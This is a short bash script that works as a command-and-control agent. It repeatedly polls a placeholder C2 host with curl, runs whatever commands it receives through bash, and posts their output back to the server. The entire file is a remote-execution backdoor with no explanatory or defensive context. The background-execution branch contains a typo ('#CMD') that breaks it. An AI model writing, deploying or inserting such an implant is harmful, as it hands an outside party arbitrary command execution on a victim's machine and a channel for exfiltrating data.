#!/bin/bash
C2_URL="https://__HOSTNAME__"

while [ true ]
do
  CMD=$(curl -s "$C2_URL/get_cmd")
  if [ ! -z "$CMD" ]
  then
    ID=$(echo $CMD | cut -d, -f 1)
    FG=$(echo $CMD | cut -d, -f 2)
    CMD=$(echo $CMD | cut -d, -f 3-)
    if [ ! "$FG" = "false" ]
    then
      echo $CMD | bash | curl -s -d @- "${C2_URL}/put_result/$ID"
    else
      echo #CMD | bash &
    fi
  else
    sleep 5
  fi
done
